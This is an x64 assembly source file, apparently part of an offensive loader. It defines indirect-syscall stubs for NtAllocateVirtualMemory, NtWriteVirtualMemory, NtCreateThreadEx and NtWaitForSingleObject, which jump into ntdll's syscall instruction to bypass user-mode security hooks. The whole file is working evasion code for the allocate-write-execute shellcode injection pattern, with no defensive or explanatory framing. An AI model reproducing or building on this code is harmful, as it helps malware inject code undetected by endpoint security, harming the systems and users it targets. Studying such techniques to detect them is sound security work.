.data
	EXTERN wNtAllocateVirtualMemory:DWORD            
	EXTERN wNtWriteVirtualMemory:DWORD                
	EXTERN wNtCreateThreadEx:DWORD                 
	EXTERN wNtWaitForSingleObject:DWORD 
	EXTERN SysAddrNtAllocateVirtualMemory:QWORD            
	EXTERN SysAddrNtWriteVirtualMemory:QWORD                
	EXTERN SysAddrNtCreateThreadEx:QWORD                 
	EXTERN SysAddrNtWaitForSingleObject:QWORD   

.code
	NtAllocateVirtualMemory proc
			mov         r10,rcx
			mov         eax,wNtAllocateVirtualMemory
			jmp QWORD PTR [SysAddrNtAllocateVirtualMemory] 
			ret
	NtAllocateVirtualMemory endp

	NtWriteVirtualMemory proc
			mov         r10,rcx
			mov         eax,wNtWriteVirtualMemory
			jmp QWORD PTR [SysAddrNtWriteVirtualMemory]
			ret
	NtWriteVirtualMemory endp

	NtCreateThreadEx proc
			mov         r10,rcx
			mov         eax,wNtCreateThreadEx
			jmp QWORD PTR [SysAddrNtCreateThreadEx]
			ret
	NtCreateThreadEx endp

	NtWaitForSingleObject proc
			mov         r10,rcx
			mov         eax,wNtWaitForSingleObject
			jmp QWORD PTR [SysAddrNtWaitForSingleObject]
			ret
	NtWaitForSingleObject endp
end

